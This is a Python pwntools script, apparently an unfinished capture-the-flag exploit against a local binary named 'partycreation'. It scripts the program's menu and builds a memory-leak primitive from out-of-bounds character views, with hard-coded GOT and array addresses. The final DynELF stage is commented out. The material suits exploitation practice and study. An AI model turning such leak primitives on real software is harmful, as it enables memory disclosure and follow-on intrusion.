from pwn import *

ADDR_BASE = 0x400000
ADDR_PLTGOT = 0x602000
ADDR_PARTY = 0x6020c0
NAME_LENGTH = 16
SIZEOF_CHARACTER = 24
PARTY_SIZE = 6
ADDR_PARTY_END = ADDR_PARTY + SIZEOF_CHARACTER*PARTY_SIZE

s = gdb.debug('./partycreation')

# Commands

def cmd_create(name):
    s.sendafter(b'> ', b'1\n')
    s.sendafter(b'>', name + b'\n')

def cmd_view(idx):
    s.sendafter(b'> ', b'2\n')
    s.sendafter(b'>', str(idx).encode() + b'\n')
    data = s.recvuntil(b'   What do you want to do?')
    subdata = data.split(b'-----------------------------')[2]
    i = subdata.rfind(b'\nStrength:')
    namedata = [x for x in subdata[len(b'\nName:         '):i]]
    namedata += [0] # trailing null byte
    if len(namedata) > NAME_LENGTH:
        raise ValueError("len(namedata) is greater than NAME_LENGTH! " + str(len(namedata)))
    namedata += [None] * (NAME_LENGTH - len(namedata))
    subsubdata = subdata[i:]
    otherdata = [x % 256 for x in list_try_map(int, subsubdata.split())]
    otherdata2 = otherdata[0:6] + list(divmod(otherdata[6], 256)) # might need reversed(list(...))
    combineddata = namedata + otherdata2

    return combineddata

def cmd_rename(idx, name):
    s.sendafter(b'> ', b'3\n')
    s.sendafter(b'>', str(idx).encode() + b'\n')
    s.sendafter(b'>', name + b'\n')

def cmd_begin_hacking():
    s.sendafter(b'> ', b'4\n')

def cmd_trigger_illegal_selection_error():
    s.sendafter(b'> ', b'0\n')

# Vuln

@memleak.MemLeak
def leaker(addr):
    print("Leaking " + hex(addr))

    # XXX
    if addr < ADDR_PLTGOT:
        return elf.read(addr, ADDR_PLTGOT - addr)
    if addr == 0x00602000:
        return b'\x20\x1e\x60\x00\x00\x00\x00\x00'
    if addr == 0x00602008:
        return bytes([0]*8)
    
    if addr >= ADDR_PARTY_END:
        return None
    diff = addr - ADDR_PARTY
    idx = diff // SIZEOF_CHARACTER
    if idx * SIZEOF_CHARACTER + ADDR_PARTY < ADDR_BASE:
        return None
    offset = diff % SIZEOF_CHARACTER
    chunk = cmd_view(idx)
    end = try_index_of(chunk, None, offset)
    data = chunk[offset:end]
    return data

# Utils

def maybe_hex(x):
    if x is None:
        return '??'
    else:
        return f'{x:02x}'

def list_try_map(f, l):
    result = []
    for x in l:
        try:
            result.append(f(x))
        except Exception:
            pass
    return result

def try_index_of(l, x, start=0):
    try:
        return l.index(x, start)
    except ValueError:
        return None

# Exploit

#elf = ELF("partycreation")
#print(elf)
#dynelf = DynELF(leaker, elf=elf)
#print(hex(dynelf.heap()))
